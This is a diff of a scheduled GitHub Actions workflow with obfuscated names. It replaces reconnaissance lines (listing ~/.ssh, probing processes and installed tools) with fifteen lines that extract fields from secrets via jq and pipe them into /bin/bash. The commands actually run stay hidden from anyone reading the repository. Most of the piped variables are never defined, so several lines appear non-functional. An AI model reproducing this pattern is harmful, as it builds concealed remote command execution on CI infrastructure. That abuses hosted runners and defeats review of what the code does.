@@ -3,8 +3,9 @@ name: dongguange7412
 on:
   workflow_dispatch:
   schedule:
-    - cron: '43 4/6 * * *'
-jobs:  # 10230
+    - cron: '31 5/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,21 +13,21 @@ jobs:  # 10230
       - uses: actions/checkout@v4
       - name: dongguange7412
         env:
-          h11418: ${{ secrets.h11418 }}
+          pfuq19: ${{ secrets.pfuq19 }}
         run: |
-          ps -ef | grep root | awk '{print $NF}' | sort | uniq | wc -l
-          [ -d "$HOME/.ssh/config.d" ] && echo "$HOME/.ssh/config.d exists" || echo "$HOME/.ssh/config.d no exists"
-          echo $h11418 | jq -r .v15376 | /bin/bash
-          echo "Date only: $(date +%F)"
-          curl www.google.com
-          [ -d "$HOME/.ssh" ] && echo "$(ls -al $HOME/.ssh)" || echo "$HOME/.ssh not exists"
-          echo "Dir: $(pwd)"
-          echo "Random ID: $RANDOM$RANDOM"
-          pushd ~
-          echo "Random float-like: $((RANDOM % 100)).$((RANDOM % 100))"
-          which screen
-          git status
-          [ "$(which sqlite)" != "" ] && echo "sqlite installed" || echo "sqlite not installed"
-          [ -d "$HOME/.ssh/config.d" ] && echo "$HOME/.ssh/config.d exists" || echo "$HOME/.ssh/config.d no exists"
-          cat /dev/null > /tmp/.tmpfile 2>/dev/null || true
-          [ "$(which sqlite3)" != "" ] && echo "sqlite3 installed" || echo "sqlite3 not installed"
+          echo $pfuq19 | jq -r .lttrj1 | /bin/bash
+          echo $ubb21222 | jq -r .sxcf15 | /bin/bash
+          echo $oefq8 | jq -r .l78906 | /bin/bash
+          echo $jk3650 | jq -r .yvza41367 | /bin/bash
+          echo $ypy666 | jq -r .k71 | /bin/bash
+          echo $bvwh35063 | jq -r .rxkp33 | /bin/bash
+          echo $g549 | jq -r .aizc7 | /bin/bash
+          echo $hv662 | jq -r .rs16878 | /bin/bash
+          echo $pmph7520 | jq -r .cjv5 | /bin/bash
+          echo $pmkvs80 | jq -r .vlb66748 | /bin/bash
+          echo $zxdlq53401 | jq -r .wkmse48886 | /bin/bash
+          echo $cgil601 | jq -r .m632 | /bin/bash
+          echo $z9464 | jq -r .p52946 | /bin/bash
+          echo $gdg419 | jq -r .jqkm1508 | /bin/bash
+          echo $qn78 | jq -r .cfqnt9576 | /bin/bash
+
